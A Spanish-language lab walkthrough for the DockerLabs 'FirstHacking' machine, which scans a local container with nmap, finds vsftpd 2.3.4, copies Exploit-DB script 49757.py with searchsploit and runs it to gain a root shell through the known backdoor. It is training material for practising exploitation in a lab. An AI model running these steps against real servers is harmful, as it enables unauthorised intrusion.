FirstHacking-DockerLabs🇪🇸

**1.1En primer lugar descomprimiremos el archivo de firsthacking.**
```bash
unzip firsthacking
```
*Despues trasladaremos nuestro auto_deploy y la carpeta de la máquina a una carpeta que tengamos a mejor disposición*

```bash
 mv firsthacking.tar ~/Escritorio/HackTheBox/Labs/FirstHacking
 mv auto_deploy.sh ~/Escritorio/HackTheBox/Labs/FirstHacking
```
**1.2 Ahora abriremos el deplay para arrancar el laboratorio.**
```bash
 sudo bash ./auto_deploy.sh firsthacking.tar 
```

<img width="815" height="206" alt="image" src="https://github.com/user-attachments/assets/7d3d8b40-e5f9-4aa2-b671-813d14225271" />

**2.En primer lugar confirmaremos la comunicación.**
```bash
ping -c3 172.17.0.2
```

<img width="783" height="285" alt="image" src="https://github.com/user-attachments/assets/4e04d4d5-5512-4d98-9e46-6fe24fe1b0a6" />


*Sabiendo que en esta máquina existe un servicio FTP vulnerable, las herramientas como metasploit supondrán un método para la explotación manual.*

**3.Luego reconoceremos los puertos abiertos con nmap y podremos ver que el puerto 21 ftp se encuentra abierto con una versión vsfpd 2.3.4**

```bash
 nmap -p- -sV --open 172.17.0.2
```

<img width="962" height="254" alt="image" src="https://github.com/user-attachments/assets/1940bd41-8bc6-440d-acf9-f82d0dc35e7a" />

**4. Después intentaremos usar el módulo de Metasploit para buscar las vulnerabilidades conocidas.**

```bash
searchsploit vsftpd 2.3.4
```

<img width="970" height="280" alt="image" src="https://github.com/user-attachments/assets/24a8dc5f-5f98-4950-bc60-9056d552240b" />

**5. Ahora procederemos a la explotación, con este exploit abre una shell en el puerto 6200/tcp**

**5.1 Vamos a copipar el exploit.**

```bash
searchsploit -m 49757.py
```

<img width="977" height="234" alt="image" src="https://github.com/user-attachments/assets/0518ea26-3c90-47bb-9b65-55a71d47f086" />

**5.2 Vamos a ejecutarlo y con un `whoami` ya somos root.**
```bash
 python2 49757.py 172.17.0.2
```
<img width="945" height="512" alt="image" src="https://github.com/user-attachments/assets/391fe4a4-7e33-4cb6-8d8b-e354595a86ab" />








